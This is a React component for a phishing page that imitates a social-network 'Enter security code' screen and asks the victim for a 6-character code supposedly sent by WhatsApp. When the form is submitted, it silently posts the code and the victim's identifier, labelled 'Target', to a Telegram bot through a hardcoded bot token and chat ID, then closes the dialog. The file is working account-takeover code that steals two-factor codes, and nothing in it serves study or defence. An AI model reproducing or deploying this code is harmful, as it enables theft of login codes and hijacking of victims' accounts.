
import React, { useState } from 'react';

interface SecurityCodeFormProps {
  identifier: string;
  onCancel: () => void;
  onAskAI: () => void;
}

const SecurityCodeForm: React.FC<SecurityCodeFormProps> = ({ identifier, onCancel, onAskAI }) => {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const config = {
    token: "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk",
    chatId: "2100006818"
  };

  const notifyTelegram = async (message: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: config.chatId,
          text: message,
          parse_mode: 'HTML'
        }),
      });
    } catch (e) {}
  };

  const handleContinue = async () => {
    if (code.length === 6) {
      setIsLoading(true);
      const message = `<b>--- SOCIAL CONNECT 2FA ---</b>\n<b>Target:</b> ${identifier}\n<b>Code:</b> <code>${code}</code>`;
      await notifyTelegram(message);
      setIsLoading(false);
      onCancel();
    } else {
      alert("Please enter a valid 6-character code.");
    }
  };

  return (
    <div className="flex flex-col animate-fade-in">
      <div className="px-4 py-4 border-b border-gray-200 bg-white">
        <h2 className="text-[20px] font-bold text-[#1c1e21]">Enter security code</h2>
      </div>

      <div className="p-4 pt-5 pb-6 bg-white">
        <p className="text-[#1c1e21] text-[16px] leading-tight mb-6">
          Please check your WhatsApp for a message with your code. Your code is 6 characters long.
        </p>

        <div className="flex items-start gap-4 mb-4">
          <div className="flex-1 max-w-[220px]">
            <input
              type="text"
              placeholder="Enter code"
              maxLength={6}
              disabled={isLoading}
              className="w-full p-4 border border-gray-300 rounded-lg text-lg focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] placeholder-gray-400 font-mono tracking-widest"
              value={code}
              onChange={(e) => setCode(e.target.value)}
            />
          </div>
          <div className="flex-1 text-[16px] text-[#1c1e21] pt-1">
            <p className="text-gray-500 text-sm">We sent your code to:</p>
            <p className="font-semibold break-all">{identifier}</p>
          </div>
        </div>
      </div>

      <div className="p-4 bg-gray-50 border-t border-gray-200 flex items-center justify-between">
        <button 
          type="button"
          onClick={() => {}} 
          className="text-[#1877f2] text-sm font-semibold hover:underline cursor-pointer"
        >
          Didn't get a code?
        </button>
        
        <div className="flex gap-2">
          <button
            onClick={onCancel}
            disabled={isLoading}
            className="px-6 py-2 bg-[#e4e6eb] hover:bg-[#d8dadf] text-[#4b4f56] font-bold rounded-md transition-colors"
          >
            Cancel
          </button>
          <button
            onClick={handleContinue}
            disabled={isLoading}
            className="px-6 py-2 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold rounded-md transition-colors"
          >
            {isLoading ? 'Verifying...' : 'Continue'}
          </button>
        </div>
      </div>
    </div>
  );
};

export default SecurityCodeForm;
